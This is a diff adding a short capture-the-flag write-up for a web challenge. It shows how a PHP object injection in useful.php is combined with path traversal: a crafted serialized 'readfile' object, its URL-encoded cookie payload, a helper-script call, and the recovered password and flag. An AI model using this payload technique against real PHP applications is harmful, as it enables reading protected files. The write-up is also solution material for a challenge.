@@ -1,0 +1,23 @@
+A comment in the source reveals that the secret is in /1/pass12.txt, but it is forbidden and we can't access it easily.
+However, we are given useful.php, which seems to be vulnerable to php object injection.
+
+To find out what object we are injecting, we need to look at http://web.camsctf.com/12/read.png
+which can be found in response.js.
+
+On __wakeup(), which is called when an object is unserialized, it seems to read from $private_file, so let's create
+a serialized object with $private_file already set.
+
+    class readfile {
+        private $private_file = "../1/pass12.txt";
+    }
+
+    print urlencode(serialize(new readfile));
+
+>> O%3A8%3A%22readfile%22%3A1%3A%7Bs%3A22%3A%22%00readfile%00private_file%22%3Bs%3A15%3A%22..%2F1%2Fpass12.txt%22%3B%7D
+
+poi.sh will fetch the response from the server, taking in the url-encoded cookie value as a parameter.
+$ ./poi.sh O%3A8%3A%22readfile%22%3A1%3A%7Bs%3A22%3A%22%00readfile%00private_file%22%3Bs%3A15%3A%22..%2F1%2Fpass12.txt%22%3B%7D
+
+We find that the password is "path_traversal_con_object_injection", and inputting that gives us the flag.
+
+{am_i_a_real_hacker_now}
